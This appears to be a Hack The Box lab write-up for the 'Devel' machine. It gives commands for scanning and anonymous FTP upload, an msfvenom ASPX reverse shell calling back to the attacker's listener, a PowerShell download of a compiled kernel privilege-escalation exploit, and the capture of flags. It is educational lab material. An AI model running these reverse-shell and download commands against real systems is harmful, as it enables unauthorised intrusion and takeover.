Devel

# Reconnaissance 

### ****Scanning****

- **Initial Scan**
	- Command 
	`sudo nmap -sC -sV -T4 -O -oA devel 10.10.10.5`
		- `-sC`: run default nmap scripts
		- `-T4`: Set timing template (higher is faster)
		- `-O`: Detect OS
		- `sV`: detect service version
		- `-oA`: Output all files formats to name "lame"

Running the initial nmap scan showed 9 open ports on the target machine

- **Port 21**: Microsoft ftpd
- **Port 80**: Microsoft IIS httpd 7.5

![initial_scan](https://github.com/benoitbeaulieu-ls/htb_devel/blob/master/Screenshots/inital_scan.png)

- **Full Scan**
Now let run a scan on all port to see if there are any other entry points.

	- Command 
	`sudo nmap -sC -sV -T4 -O -p- -oA devel_full 10.10.10.40`
		-	`-p-`: Scan all ports
		

We get the same results from the full scan.
[full scan]

- **UDP Scan**
Now to be extra thorough I'm going to run a UDP scan.

	- Command
	`sudo nmap -sU -T4 -O -p- -oA devel_udp 10.10.10.40`
		- `-sU`: UDP scan

[udp_scan.png]

--------------------------------------------
--------------------------------------------
# Enumeration

We saw in our initial scan that the server allows annonymous login on the FTP server. Meaning that anyone can login.

`ftp 10.10.10.5`

[ftp_login.png]

We can even list the files in the current directory.

[ftp_directories.png]

Let's see if we visit these files on the browser

[browser.png]

This leads me to believe that the ftp server is uploading files to the root directory of the web server.

I created a test file to see if I was able to upload it to the server and it was succesful.

[test_file,png]

We should be able to get a shell with this knowledge.

# Exploitation

We need to generate a payload in order to upload it to the FTP server and execute it in the browser to get a reverse shell. Since this is a windows web server we're going to need to generate our payload as a .aspx file.

`msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.15 LPORT=4444 -o devel_shell.aspx `

Now lets put the shell on the server

[put_shell.png]

Now lets set up out listener

`nc -lvnp 4444`

Now we can execute the file in the browser. We got our shell!

[reverse_shell.png]

# Priviledge Escalation

We have our shell as the user "iis apppool\web". We don't have much priviledge with this account so we're going to need to elevate our priviledges.

[user_shell.png]

Let's get some more information about this device.

`systeminfo`

The info shows that this machine is on an old version of windows and it have not been updated

Let's Google for exploits on the windows version "Microsoft Windows 7 build 7600"

We found one on exploit db so we should be able to find it in searchploit by searching the vulnerability name.

[priv_esc.png]

`searchsploit -m 40564`

Now that we have it copied to our directory we need to compile it with the instructions below

[compile_instructions.png]

`sudo apt install mingw-w64 `

Now we can compile it using the command listed in the exploit.

`i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32`

Now lets set up a quick http server to transfer the file to the machine 

`python -m SimpleHTTPServer 8080`

Since there is no netcat installed on the machine, let use some powershell to grba the file.

`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8080/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"`

After running that we finally hve the exe file on our target machine 

[exe_ontarget.png]

After executing the file we have admin priviledges!

[admin_priv.png]

Navigating to babis desktop directory we got the user flag

[user_flag.png]

Navigating to the administrators desktop we got the root directory.

[root_flag.png]
